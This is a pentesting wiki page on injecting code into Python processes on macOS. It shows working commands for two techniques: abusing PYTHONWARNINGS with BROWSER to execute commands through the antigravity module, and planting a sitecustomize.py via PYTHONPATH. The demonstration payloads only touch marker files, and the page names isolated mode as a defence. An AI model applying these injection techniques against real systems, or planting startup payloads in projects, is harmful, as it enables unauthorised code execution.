# macOS Python Application Injection

{{#include ../../../banners/hacktricks-training.md}}

## Via the `PYTHONWARNINGS` and `BROWSER` environment variables

If an attacker can control a Python process's environment, the combination of `PYTHONWARNINGS` and `BROWSER` can trigger command execution when Python imports the `antigravity` module while processing a crafted warning option. The technique relies on `antigravity` opening a URL with Python's `webbrowser` module, which honors the `BROWSER` environment variable.<sup>[[1]](#references)</sup>

```bash
# Generate an example Python script.
echo "print('hi')" > /tmp/script.py

# Create /tmp/hacktricks through the inherited environment.
PYTHONWARNINGS="all:0:antigravity.x:0:0" BROWSER="/bin/sh -c 'touch /tmp/hacktricks' #%s" python3 /tmp/script.py

# With isolated mode, inject the warning rule using -W instead.
BROWSER="/bin/sh -c 'touch /tmp/hacktricks' #%s" python3 -I -W all:0:antigravity.x:0:0 /tmp/script.py
```

## Via `PYTHONPATH` and `sitecustomize.py`

During normal startup Python's `site` module adds site-specific paths and then attempts to import a module named `sitecustomize`. By placing an attacker-readable directory first on `PYTHONPATH`, an attacker who controls the process environment can make Python import a payload before the target script. The `-S` flag disables automatic `site` initialization, while isolated mode (`-I`) ignores `PYTHONPATH` and implies `-s` and `-E`.<sup>[[2]](#references)[[3]](#references)</sup>

```bash
mkdir -p /tmp/python-startup
cat >/tmp/python-startup/sitecustomize.py <<'EOF'
from pathlib import Path
Path('/tmp/python-sitecustomize-executed').touch()
EOF

PYTHONPATH=/tmp/python-startup python3 /tmp/script.py
```

## References

- [1] [Hacking with Environment Variables - elttam](https://www.elttam.com/blog/env/)
- [2] [site — Site-specific configuration hook](https://docs.python.org/3/library/site.html)
- [3] [Python command-line and environment](https://docs.python.org/3/using/cmdline.html)

{{#include ../../../banners/hacktricks-training.md}}
